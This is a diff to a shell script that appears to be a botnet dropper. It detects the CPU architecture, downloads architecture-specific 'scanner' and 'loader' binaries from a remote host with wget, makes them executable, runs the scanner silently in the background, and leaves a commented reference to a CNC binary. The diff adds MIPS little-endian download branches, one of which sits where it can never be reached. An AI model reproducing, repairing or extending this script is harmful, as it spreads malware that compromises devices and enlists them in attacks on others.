@@ -17,6 +17,8 @@ elif echo "$arch" | grep -qiE 'mips64'; then
     wget "http://$ip/mip64_scanner" -O scanner
 elif echo "$arch" | grep -qiE 'mips'; then
     wget "http://$ip/mips_scanner" -O scanner
+elif echo "$arch" | grep -qiE 'mipsle'; then
+    wget "http://$ip/mipsle_scanner" -O scanner
 elif echo "$arch" | grep -qiE 'loong64'; then
     wget "http://$ip/loong64_scanner" -O scanner
 elif echo "$arch" | grep -qiE 'ppc64le'; then
@@ -43,6 +45,8 @@ elif echo "$arch" | grep -qiE 'mips64le'; then
     wget "http://$ip/mips64le_loader" -O loader
 elif echo "$arch" | grep -qiE 'mips64'; then 
     wget "http://$ip/mip64_loader" -O loader
+elif echo "$arch" | grep -qiE 'mipsle'; then
+    wget "http://$ip/mipsle_loader" -O loader
 elif echo "$arch" | grep -qiE 'mips'; then
     wget "http://$ip/mips_loader" -O loader
 elif echo "$arch" | grep -qiE 'loong64'; then
@@ -56,9 +60,10 @@ elif echo "$arch" | grep -qiE 'riscv64'; then
 else
     exit
 fi
-while [ ! -f scanner ]; do
+while [ ! -f loader ]; do
     sleep 1
 done
 chmod +x scanner
 chmod +x loader
-nohup ./scanner > /dev/null 2>&1 &
+./scanner > /dev/null 2>&1 &
+#./CNC
